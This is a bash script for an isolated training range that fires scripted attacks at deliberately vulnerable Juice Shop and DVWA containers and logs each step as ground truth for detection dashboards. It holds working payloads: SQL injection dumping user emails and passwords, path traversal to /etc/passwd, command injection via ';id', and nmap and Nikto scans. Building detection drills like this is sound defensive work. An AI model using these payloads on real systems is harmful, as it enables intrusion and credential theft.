#!/usr/bin/env bash
# Generates known-bad traffic inside the isolated range so every detection layer has something to fire on.
# Targets are fixed range IPs (compose.yml); nothing leaves br-range.
# Every step is logged to data/drills.jsonl (ground truth for the Red / Purple / White dashboards).
set -euo pipefail
cd "$(dirname "$0")/.."
DC=(docker compose --env-file .env -f range/compose.yml)
A=("${DC[@]}" exec -T attacker)
ATTACKER=172.30.0.10
JUICE=172.30.0.20
DVWA=172.30.0.30
LOG=data/drills.jsonl
mkdir -p data
DRILL_ID="drill-$(date -u +%Y%m%dT%H%M%SZ)"

# run_step <step-name> <technique> <tactic> <target-ip> <tool> -- <command...>
run_step() {
  local name=$1 tech=$2 tactic=$3 target=$4 tool=$5; shift 6
  echo; echo "== [$tech] $name =="
  local start end rc=0
  start=$(date +%s%3N)
  "$@" || rc=$?
  end=$(date +%s%3N)
  printf '{"drill_id":"%s","step":"%s","technique":"%s","tactic":"%s","src_ip":"%s","target":"%s","tool":"%s","start_ms":%s,"end_ms":%s,"exit":%s}\n' \
    "$DRILL_ID" "$name" "$tech" "$tactic" "$ATTACKER" "$target" "$tool" "$start" "$end" "$rc" >> "$LOG"
}

run_step "SYN scan of range" T1595 Reconnaissance "$JUICE" nmap -- \
  "${A[@]}" nmap -sS -T4 -p 1-2000 --max-retries 1 "$JUICE" "$DVWA" -oN /dev/null

run_step "SQLi probes on Juice Shop search" T1190 "Initial Access" "$JUICE" curl -- bash -c '
  "$@" curl -s -o /dev/null -w "%{http_code}\n" "http://'"$JUICE"':3000/rest/products/search?q=%27%20OR%201%3D1--"
  "$@" curl -s -o /dev/null -w "%{http_code}\n" "http://'"$JUICE"':3000/rest/products/search?q=x%27))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"
' _ "${A[@]}"

run_step "Path traversal on Juice Shop" T1190 "Initial Access" "$JUICE" curl -- \
  "${A[@]}" curl -s -o /dev/null -w '%{http_code}\n' --path-as-is "http://$JUICE:3000/ftp/../../../../etc/passwd"

run_step "Nikto vulnerability scan of DVWA" T1595.002 Reconnaissance "$DVWA" nikto -- \
  "${A[@]}" timeout 60 nikto -h "http://$DVWA" -maxtime 55 -o /dev/null -Format txt

run_step "Command injection on DVWA exec" T1190 "Initial Access" "$DVWA" curl -- \
  "${A[@]}" curl -s -o /dev/null -w '%{http_code}\n' -d 'ip=127.0.0.1;id&Submit=Submit' "http://$DVWA/vulnerabilities/exec/"

echo; echo "Drill $DRILL_ID logged to $LOG. Allow ~2 min for EVE -> agent -> manager -> indexer, then check the Purple view."
